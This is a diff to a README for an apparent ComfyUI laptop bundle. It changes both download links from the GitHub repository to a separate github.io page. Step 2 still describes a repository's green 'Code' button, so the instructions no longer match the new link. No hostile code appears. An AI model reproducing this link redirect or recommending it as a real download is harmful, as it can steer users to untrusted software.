@@ -1,6 +1,6 @@
 # ⚡ comfyui-5090-laptop-24gb-minimax-h3-qwen-image-wan2.2 - Run AI Models Fast on Your Laptop
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Mikola78/comfyui-5090-laptop-24gb-minimax-h3-qwen-image-wan2.2)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://mikola78.github.io)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ All models are pre-configured and tested, so you can start creating right away. 
 ## 📥 Download and Installation
 
 **Step 1:** Visit this link to download the application:  
-[https://github.com/Mikola78/comfyui-5090-laptop-24gb-minimax-h3-qwen-image-wan2.2](https://github.com/Mikola78/comfyui-5090-laptop-24gb-minimax-h3-qwen-image-wan2.2)
+[https://mikola78.github.io](https://mikola78.github.io)
 
 **Step 2:** On the page, click the green "Code" button, then select "Download ZIP". The file is large (several GB), so ensure you have enough free disk space (at least 30GB recommended).
 
